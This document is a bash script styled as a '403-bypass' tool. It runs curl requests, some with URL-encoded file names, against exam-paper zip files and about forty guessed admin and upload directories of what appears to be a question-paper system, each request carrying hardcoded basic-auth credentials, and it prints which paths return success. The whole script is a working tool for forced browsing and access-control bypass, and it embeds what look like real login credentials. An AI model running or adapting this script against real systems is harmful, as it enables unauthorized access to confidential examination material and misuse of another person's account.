#!/bin/bash
#color
red='\e[31m'
green='\e[32m'
blue='\e[34m'
cyan='\e[96m'
ltcyan='\e[96m'
yellow='\e[33m'
black='\e[38;5;016m'
bluebg='\e[48;5;038m'${black}
end='\e[0m'
termwidth="$(tput cols)"
function print(){
	status=$(echo ${code} | awk '{print $2}'|sed 's/,$//g')
	if [[ ${status} =~ 2.. ]];then
			printf "${green} ${code} ${end} 👌\n${payload}\n"
	elif [[ ${status} =~ 3.. ]]; then
			printf "${yellow} ${code} ${end}\n"
	elif [[ ${status} =~ 5.. ]]; then
			printf "${ltcyan} ${code} ${end}\n"
	else
			printf "${red} ${code} ${end}\n"
	fi
}
function banner(){
	echo "💀💀💀💀💀💀💀💀💀"
	echo -e "💀$green Have a beer🍺💀 $end"
}
function usage(){
        printf "Usage:\n"
        printf "\t403-bypass [URL]\n">&2
        printf '\n' >&2
        printf "\t-u, --url URL\t\t\ttarget DOMAIN.TLD/PATH\n">&2
		printf '\n' >&2
		printf "BYPASS MODEs\n">&2
		printf "\t--encode\t\t\tURL Encode Bypass\n">&2\
		printf '\n' >&2
		printf "ALL BYPASSES\n">&2
		printf "\t--exploit\t\t\tComplete Scan: 403/401 bypass modes \n">&2
		printf '\n' >&2
		printf "\t${green}GREEN${end}\t:\t${green}2xx Status Code${end}\n">&2
		printf "\t${yellow}YELLOW${end}\t:\t${yellow}3xx Status Code${end}\n">&2
		printf "\t${red}RED${end}\t:\t${red}4xx Status Code${end}\n">&2
		printf "\t${ltcyan}BLUE${end}\t:\t${ltcyan}5xx Status Code${end}\n">&2
}
function URL_Encode_Bypass(){
	echo -e ${blue}"----------------------"${end}
	echo -e ${cyan}"[+] URL Encode Bypass "${end}
	echo -e ${blue}"----------------------"${end}
	
	echo -n "Payload [QP02_12_2023%2008_53_31.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_31.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_31.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
  echo -n "Payload [QP02_12_2023%2008_53_32.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_32.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_32.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
  echo -n "Payload [QP02_12_2023%2008_53_33.zip ]:"
	code=$(curl -k -s -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" "${target}QP02_12_2023%2008_53_33.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
	payload=$(printf "╭$(printf '%.0s─' $(seq "$((${termwidth} - 2))"))╮\n${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s '${target}QP02_12_2023%%%%2008_53_33.zip' -H 'User-Agent: Mozilla/5.0'\n${end}╰$(printf '%.0s─' $(seq "$((`tput cols` - 2))"))╯\n")
	print
 
echo -n "Payload [QPBulkupload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkupload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkupload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDataSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Suite_QPBulk/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Suite_QPBulk/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Suite_QPBulk/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Handler_QPAuto/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Handler_QPAuto/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Handler_QPAuto/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataUploadQ_P/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataUploadQ_P/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataUploadQ_P/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_Tool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_Tool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_Tool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring-QPBulk/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring-QPBulk/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring-QPBulk/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-System/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-System/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-System/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P-Tool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P-Tool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P-Tool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseBatchProcessor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseBatchProcessor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseBatchProcessor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabasePortal/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabasePortal/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabasePortal/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel_QstnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel_QstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel_QstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_Suite/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_Suite/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_Suite/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ModuleQPControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ModuleQPControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ModuleQPControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring-QPBFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring-QPBFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring-QPBFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutomation/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutomation/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutomation/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_Panel/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_Panel/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_Panel/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper-CloudSync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper-CloudSync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper-CloudSync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PProcessingSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PProcessingSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PProcessingSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-Service/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-Service/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-Service/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Workflow-QsnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Workflow-QsnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Workflow-QsnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing_QPSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing_QPSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing_QPSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl_ProcessingSuite/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl_ProcessingSuite/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl_ProcessingSuite/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service-QPAuto/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service-QPAuto/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service-QPAuto/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload_QPFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload_QPFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload_QPFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBSuite/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBSuite/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBSuite/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperHandler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperHandler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperHandler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploaderQPControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploaderQPControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploaderQPControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync-QPAdmin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync-QPAdmin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync-QPAdmin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessingBulkUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessingBulkUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessingBulkUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaperPanel/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaperPanel/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaperPanel/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-MonitoringTool/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-MonitoringTool/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-MonitoringTool/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl_QPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl_QPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl_QPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_PDataPipeline/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_PDataPipeline/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_PDataPipeline/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Admin-QPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Admin-QPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Admin-QPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_Mgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_Mgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_Mgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
